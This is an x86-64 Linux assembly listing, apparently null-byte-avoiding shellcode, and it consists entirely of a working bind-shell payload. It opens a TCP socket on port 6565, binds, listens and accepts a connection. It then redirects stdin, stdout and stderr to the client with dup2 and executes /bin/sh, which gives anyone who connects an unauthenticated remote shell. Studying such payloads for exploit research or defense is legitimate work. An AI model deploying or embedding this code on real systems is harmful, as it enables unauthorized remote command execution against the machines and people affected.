section .text

global _start

_start:
	xor rax,rax
	xor rdx,rdx
	xor r8,r8
	xor rsi,rsi
	xor rdi,rdi
	
	mov al,41
	mov dil,2
	mov sil,1
	syscall

	mov rdi,rax

	; bind()

	push rdx
	mov dword[rsp-4],edx 
	mov word[rsp-6],0xa519
	mov word[rsp-8],0x2
	sub rsp,8
	mov rsi,rsp

	mov al,49
	mov dl,16
	syscall

	;listen()

	mov al,50
	mov rsi,r8
	syscall

	; accept()

	mov al,43
	xor rsi,rsi
	syscall

	mov r9,rax

	mov al,3
	syscall
	
	xor rsi,rsi
	mov sil,2
	mov rdi,r9
	
dup2:
	mov al,33
	syscall
	dec rsi
	jns dup2

	xor rax,rax
	push rax
	mov r10,0x68732f6e69622f2f
	push r10
	mov rdi,rsp

	xor rsi,rsi
	xor rdx,rdx
	
	mov al,59
	syscall

